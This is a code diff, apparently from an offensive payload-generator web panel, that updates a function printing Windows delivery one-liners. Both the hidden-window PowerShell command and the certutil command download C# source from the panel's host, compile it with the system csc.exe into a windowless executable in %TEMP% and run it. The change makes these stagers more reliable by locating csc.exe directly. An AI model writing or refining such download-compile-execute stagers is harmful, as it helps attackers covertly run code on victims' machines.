@@ -498,11 +498,12 @@ function genPayload(){
         '</pre>';
     }else{
       html+='<pre class="dt-code" style="margin:0">'+
-        ':: 方式1: PowerShell 下载运行\n'+
-        'powershell -w hidden -c \"IWR -Uri \''+location.origin+'/'+dl+'\' -OutFile $env:TEMP\\\\j.cs; '+
-        'cd $env:TEMP; csc /target:winexe /out:j.exe j.cs; Start-Process j.exe\"\n\n'+
-        ':: 方式2: certutil 下载\n'+
-        'certutil -urlcache -split -f '+location.origin+'/'+dl+' %TEMP%\\\\j.cs && csc /target:winexe /out:%TEMP%\\\\j.exe %TEMP%\\\\j.cs && %TEMP%\\\\j.exe'+
+        ':: 方式1: PowerShell 下载运行（自动定位系统自带 csc.exe，无需 PATH）\n'+
+        'powershell -w hidden -c \"IWR -Uri \''+location.origin+'/'+dl+'\' -OutFile $env:TEMP\\j.cs; '+
+        '$csc=$env:WINDIR+\'\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\'; if(!(Test-Path $csc)){$csc=\'csc\'}; '+
+        '& $csc /nologo /target:winexe /out:$env:TEMP\\j.exe $env:TEMP\\j.cs; Start-Process $env:TEMP\\j.exe\"\n\n'+
+        ':: 方式2: certutil 下载（cmd 窗口）\n'+
+        'certutil -urlcache -split -f '+location.origin+'/'+dl+' %TEMP%\\j.cs && %WINDIR%\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /nologo /target:winexe /out:%TEMP%\\j.exe %TEMP%\\j.cs && %TEMP%\\j.exe'+
         '</pre>';
     }
     html+='</div></div>';
